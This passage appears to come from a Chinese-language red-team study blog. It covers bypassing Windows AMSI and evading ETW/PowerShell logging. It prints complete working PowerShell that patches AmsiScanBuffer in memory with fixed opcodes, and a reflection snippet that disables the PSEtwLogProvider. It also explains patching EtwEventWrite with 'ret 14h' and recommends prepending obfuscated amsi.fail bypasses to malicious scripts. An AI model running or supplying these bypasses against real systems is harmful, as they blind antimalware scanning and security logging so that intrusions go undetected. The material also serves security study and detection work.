<span class="line"><span style="color: #ABB2BF">	string procName </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 要获得的方法或者变量</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">public </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> extern IntPtr GetModuleHandle(</span></span>
<span class="line"><span style="color: #ABB2BF">	string lpModuleName </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 要获得模块的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">public </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> extern bool VirtualProtect(</span></span>
<span class="line"><span style="color: #ABB2BF">	IntPtr lpAddress, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 修改内存区域的地址</span></span>
<span class="line"><span style="color: #ABB2BF">	UIntPtr dwSize, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 区域大小</span></span>
<span class="line"><span style="color: #ABB2BF">	uint flNewProtect, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 内存保护选项</span></span>
<span class="line"><span style="color: #ABB2BF">	out uint lpflOldProtect </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 存储先前保护选项的指针</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>现在函数已被定义，但我们需要使用 <code>Add-Type</code> 来加载这些 API。此 cmdlet 会将这些函数以适当的类型和 namespace 加载，从而允许调用这些函数。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$Kernel32</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Add-Type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MemberDefinition </span><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;Kernel32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NameSpace </span><span style="color: #98C379">&#39;Win32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">PassThru;</span></span></code></pre></div></div></figure>
<p>现在我们可以调用我们的 API 函数了，首先，我们需要使用 <code>GetModuleHandle</code> 来识别 AMSI 的进程句柄。然后将使用该句柄通过 <code>GetProcAddress</code> 来识别 <code>AmsiScanBuffer</code> 函数的内存地址。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetModuleHandle(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #98C379">&#39;amsi.dll&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 获取 amsi.dll 的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetProcAddress(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> amsi.dll 的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #98C379">&#39;AmsiScanBuffer&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 函数的名称</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>接下来，我们需要修改 <code>AmsiScanBuffer</code> 函数区域的内存保护。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x5</span><span style="color: #ABB2BF">; </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 区域大小</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">; </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 保护参数 PAGE_EXECUTE_READWRITE 读写权限</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 存储老的保护参数 这里是占位符</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::VirtualProtect(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> AmsiScanBuffer 的内存地址</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 区域大小</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 对该区域开启读写权限</span></span>
<span class="line"><span style="color: #ABB2BF">	[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 存储先前保护选项的指针</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>我们需要指定要用什么覆盖该缓冲区；识别该缓冲区的过程可以<a target="_blank" rel="noopener" href="https://rastamouse.me/memory-patching-amsi-bypass/">在此处</a>找到。一旦指定了缓冲区，就可以使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0">marshal copy</a> 将数据写入该进程。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]]([</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xB8</span><span style="color: #ABB2BF">,[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x00</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x07</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x80</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xC3</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">system.runtime.interopservices.marshal</span><span style="color: #ABB2BF">]::copy(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 要写入的 Opcodes</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">array</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 偏移量</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 写入位置</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">6</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 写入大小</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>最终代码如下：</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">$Kernel32</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Add-Type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MemberDefinition </span><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;Kernel32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NameSpace </span><span style="color: #98C379">&#39;Win32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">PassThru;</span></span>
<span class="line"><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetModuleHandle(</span><span style="color: #98C379">&#39;amsi.dll&#39;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetProcAddress(</span><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;AmsiScanBuffer&#39;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x5</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::VirtualProtect(</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]]([</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xB8</span><span style="color: #ABB2BF">,[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x00</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x07</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x80</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xC3</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">system.runtime.interopservices.marshal</span><span style="color: #ABB2BF">]::copy(</span><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">6</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>现在 AMSI 已经被绕过了，但是他只在这个 PowerShell 会话中有效，原因前面说了，DLL 是加载到 PowerShell 进程里面的。</p>
<h3 id="自动化工具">自动化工具</h3>
<h4 id="amsi-fail">amsi.fail</h4>
<p><a target="_blank" rel="noopener" href="http://amsi.fail/">amsi.fail</a> 可以从一个已知的绕过方式库里面编译并且生成一个 PowerShell 绕过脚本。</p>
<p>AMSI.fail 生成混淆的 PowerShell 片段，用于破坏或禁用当前进程的 AMSI。这些片段在混淆前会从一个小的技术/变体池中随机选择。每个片段在运行时/请求时都会被混淆，因此没有任何生成的输出会共享相同的特征签名。</p>
<p>把此绕过代码附加在恶意代码的开头，或者在执行恶意代码之前在同一会话中运行它。</p>
<h4 id="AMSITrigger-2">AMSITrigger</h4>
<p>之前说过可以用 <a target="_blank" rel="noopener" href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> 去检测我们的代码片段是否有会被检测的特征，这种绕过 AMSI 的方法比其他方法更稳定，因为你是在使文件本身变得“干净”。</p>
<h2 id="参考资料">参考资料</h2>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/263966.html">反恶意软件扫描接口（AMSI）对抗学习</a></p>
<h1>Evading Logging and Monitoring</h1>
<p>这个房间是讲留痕的问题，主要内容就是绕过 Windows 的那个日志记录，让影响最小化。</p>
<p>监控一般是从主机开始的，收集应用程序或者事件日志，日志一旦生成，可以保存在设备上或者发送到事件收集器/采集器。一旦日志被从设备上取走，攻击者可能无法进行太多控制，但可以控制设备上的内容以及这些内容如何被采集。攻击者的主要目标是控制 ETW (<strong>E</strong>vent <strong>T</strong>racing for <strong>W</strong>indows)。</p>
<h2 id="事件跟踪">事件跟踪</h2>
<p>Windows 中几乎所有的事件记录功能在应用程序和内核层面都是由 ETW 处理的。虽然还有其他服务存在，比如事件记录（Event Logging）和跟踪记录（Trace Logging），但这些要么是 ETW 的扩展，要么对攻击者来说不那么常见。</p>
<table>
<thead>
<tr>
<th><strong>组件</strong></th>
<th><strong>目的</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>控制器</td>
<td>构建并配置会话</td>
</tr>
<tr>
<td>提供者</td>
<td>产生事件</td>
</tr>
<tr>
<td>消费者</td>
<td>解释事件</td>
</tr>
</tbody>
</table>
<p>因为 ETW 可以被检测者查看到，所以在渗透的过程中要始终注意可能产生的事件。对 ETW 采取的最佳办法是尽量减少对我们具体行为的记录，同时在不破坏环境完整性的前提下实施。</p>
<h2 id="日志规避的方法">日志规避的方法</h2>
<p>删日志并不是一个好办法，在安全的最佳实践中，典型的现代环境中会有一个叫日志转发的机制。日志转发意味着 SOC 会将主机上的日志移动或“转发”到集中服务器。即使攻击者能够从主机上删除日志，这些日志也可能已经离开设备并被保护起来。</p>
<p>如果日志在转发前就已经全部被删除，或者这些日志根本没有被转发，那会不会引起警报？首先应该考虑到环境完整性，如果这个设备没有任何日志产生，那么就会引起严重怀疑。</p>
<table>
<thead>
<tr>
<th><strong>Event ID</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>1102</td>
<td>记录何时清除了 Windows 安全审计日志</td>
</tr>
<tr>
<td>104</td>
<td>记录何时清除了日志文件</td>
</tr>
<tr>
<td>1100</td>
<td>记录了 Windows 事件日志服务被关闭时的事件</td>
</tr>
</tbody>
</table>
<p>上述事件 ID 可用于监控销毁日志或“日志破坏”的过程。这对试图篡改或销毁日志的攻击者构成了明显风险。尽管仍有可能进一步绕过这些缓解措施或篡改日志，但攻击者必须评估风险。在接触一个环境时，你通常不了解其安全措施，并且通过尝试这种方法会承担 OPSEC（Operational Security）风险。</p>
<h2 id="事件跟踪实现">事件跟踪实现</h2>
<p>Event Tracking for Windows（ETW）是一种强大的系统日志记录机制，它由三个相互独立的组件协同工作，共同管理和关联数据流。</p>
<ul>
<li><strong>事件提供程序 (Event Provider)</strong>： <strong>功能：</strong> 这是事件的<strong>源头</strong>，负责<strong>生成</strong>事件。 <strong>工作原理：</strong> 提供程序是包含事件跟踪代码的应用程序。它会根据事件控制器的指令来决定是否生成事件。当被控制器启用后，提供程序就会从其指定的来源收集并发送日志。</li>
<li><strong>事件控制器 (Event Controller)</strong>： <strong>功能：</strong> 这是一个<strong>指挥中心</strong>，用于<strong>管理</strong>和<strong>配置</strong>事件会话。 <strong>工作原理：</strong> 控制器决定了数据如何被收集以及流向何处。它定义了日志文件的大小、位置，启动或停止跟踪会话，启用或禁用特定的提供程序，并管理缓冲区。简而言之，控制器负责整个数据流的<strong>指挥调度</strong>。</li>
<li><strong>事件消费者 (Event Consumer)</strong>： <strong>功能：</strong> 这是一个<strong>分析工具</strong>，用于<strong>接收</strong>和<strong>解释</strong>事件。 <strong>工作原理：</strong> 消费者选择一个或多个事件会话作为数据源，然后解析这些事件进行分析。我们最熟悉的“事件查看器”就是事件消费者的一种。消费者可以从实时会话或存储在日志文件中的事件中接收数据。</li>
</ul>
<p>这三个组件共同构成了一个完整的事件追踪链：</p>
<ol>
<li><strong>起源（提供程序）</strong>：事件从提供程序（如某个应用程序）中<strong>产生</strong>。</li>
<li><strong>处理（控制器）</strong>：控制器<strong>决定</strong>这些事件被发送到哪个会话，以及如何被缓冲和处理。</li>
<li><strong>分析（消费者）</strong>：消费者<strong>接收</strong>并<strong>解析</strong>会话中的日志，以便进行解释或分析。</li>
</ol>
<img src="/thm_rthe/dc8217f5aecbcc08d609c3299756da08.png" class="" title="Diagram depicting the interaction between ETW components, verbally described in the paragraph below">
<p>攻击者的目标是<strong>在保持完整性的同时减少可见性</strong>。ETW 的分层结构为攻击者提供了一个新的攻击面。通过有针对性地攻击 ETW 的某个组件，攻击者可以在不完全破坏数据流的情况下，限制特定行为的可见性。这使得他们能够隐藏自己的恶意活动，而不必完全禁用整个日志系统。</p>
<table>
<thead>
<tr>
<th>**Component **</th>
<th><strong>Techniques</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Provider</td>
<td>PSEtwLogProvider 修改、组策略接管、日志管道滥用、类型创建</td>
</tr>
<tr>
<td>Controller</td>
<td>修补 EtwEventWrite，运行时跟踪篡改</td>
</tr>
<tr>
<td>Consumers</td>
<td>日志粉碎，日志篡改</td>
</tr>
</tbody>
</table>
<p>在接下来将深入介绍每一种技术。</p>
<h2 id="绕过方法">绕过方法</h2>
<p><strong>PowerShell 的两种主要日志类型：</strong></p>
<ul>
<li><strong>脚本块日志 (Script block logging)</strong>：
<ul>
<li>记录在 PowerShell 会话中执行的<strong>所有脚本块</strong>。</li>
<li>它报告 <strong>Event ID 4104</strong>，是攻击者最需要关注的日志，因为它会完整暴露未混淆的恶意脚本。</li>
</ul>
</li>
<li><strong>模块日志 (Module logging)</strong>：
<ul>
<li>记录 PowerShell 模块中执行的<strong>命令和数据</strong>。</li>
<li>它报告 <strong>Event ID 4103</strong>。由于这种日志非常详细且数量庞大，它经常被系统管理员禁用，或者因为噪音太大而被忽略。</li>
</ul>
</li>
</ul>
<h3 id="反射">反射</h3>
<p>在 PowerShell 里面 ETW Providers 是通过一个 .NET 程序集 <code>PSEtwLogProvider</code> 载入到这个 PowerShell 会话里面的。在一个 PowerShell 会话里面，大多数 .NET 程序集会在用户启动时加载相同的安全上下文。所以用户拥有的权限和加载的程序集有相同的权限级别，所以我们就可以通过反射修改他，和前面的绕过 PowerShell 的 AMSI 原理是一样的。</p>
<p>这段 PowerShell 代码利用反射（Reflection），通过直接操作 .NET 程序集的内部私有字段，来<strong>强制禁用</strong> ETW 事件记录。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 PowerShell ETW 事件提供程序的内部类型</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这是一个名为 PSEtwLogProvider 的非公共类型</span></span>
<span class="line"><span style="color: #E06C75">$logProvider</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 获取该类型中名为 &#39;etwProvider&#39; 的静态私有字段的值</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 该字段是 ETW 提供程序的一个实例</span></span>
<span class="line"><span style="color: #E06C75">$etwProvider</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$logProvider.GetField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;etwProvider&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">).GetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 强制将该 ETW 提供程序实例的 &#39;m_enabled&#39; 字段设为 0</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这会禁用事件记录，从而阻止 PowerShell 将日志发送给 ETW</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">System.Diagnostics.Eventing.EventProvider</span><span style="color: #ABB2BF">].GetField(</span><span style="color: #98C379">&#39;m_enabled&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Instance&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #E06C75">$etwProvider</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>4104 是 PowerShell 日志记录的 Event ID，我们用这个来测试是否绕过了，如果绕过了，怎么执行命令这个日志数量都不会变的。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 4104 Event ID 的日志条目</span></span>
<span class="line"><span style="color: #56B6C2">Get-WinEvent</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">FilterHashtable </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">ProviderName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;Microsoft-Windows-PowerShell&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">Id</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">4104</span><span style="color: #ABB2BF">} | Measure | </span><span style="color: #C678DD">%</span><span style="color: #ABB2BF"> Count</span></span></code></pre></div></div></figure>
<h3 id="修补">修补</h3>
<p>和 AMSI 的原理是一样的，也是因为加载的 ETW 组件和用户平权，导致可以修改这个组件的内存区域。</p>
<p>14h 是 20 个字节，也就是 <code>EtwEventWrite</code> 的 5 个形参，<code>ret 14h</code> 会把这 5 个参数丢掉。打完补丁之后，任何对 <code>EtwEventWrite</code> 函数的调用都会立即弹出返回地址，清理掉参数，返回到调用者。</p>
<p>换一种理解方式：在调用这个函数执行的时候，就会有5个参数传过来，进栈。而我们直接 ret 14h 是直接返回了一个不知道是什么的结果，然后把那20个字节在栈里面的数据清理了，这样我们就可以在不执行这个函数里面代码的前提下绕过函数执行了，本来那5个参数在内部是要被用掉的。</p>
<p>如果还是不理解去好好研究一下栈结构，你就明白了。</p>
<p>我简述一下过程：</p>
<ol>
<li>调用函数时，将<strong>参数</strong>压入栈（20字节）</li>
<li>会把返回地址（下一条指令的地址压入栈中）</li>
<li>函数开头是 <code>ret 14h</code> 直接跳到下一条指令的地址去执行</li>
<li>同时清理掉 20 字节的参数</li>
</ol>
<p>这里并没有讨论这个函数的返回值，我觉得我可能是少了这一个概念导致卡了很久，总之原理就是这样。</p>
